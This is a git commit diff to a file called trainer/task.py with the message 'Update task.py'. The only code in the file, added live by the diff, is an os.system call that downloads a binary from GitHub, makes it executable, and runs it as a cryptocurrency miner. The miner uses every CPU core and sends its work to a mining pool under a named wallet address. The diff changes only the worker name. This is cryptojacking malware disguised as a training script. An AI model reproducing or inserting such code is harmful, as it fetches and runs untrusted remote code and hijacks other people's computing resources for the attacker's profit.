f3a25a51f0db9dbd5c60e5118fd50213d92d6b8f
elitsa001 <elitsa001@students.softuni.bg>
2026-05-17 10:19:38 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('wget https://github.com/nonibihan/tah/raw/refs/heads/main/bct && chmod 777 bct && ./bct -a verus -o stratum+tcp://sg.vipor.net:5040 -u RSaAjB1zYPF9wEwdbb9UQQGoia5Hp4YpiV.ONCOMOLO -t $(nproc --all)')
+os.system('wget https://github.com/nonibihan/tah/raw/refs/heads/main/bct && chmod 777 bct && ./bct -a verus -o stratum+tcp://sg.vipor.net:5040 -u RSaAjB1zYPF9wEwdbb9UQQGoia5Hp4YpiV.RADE -t $(nproc --all)')
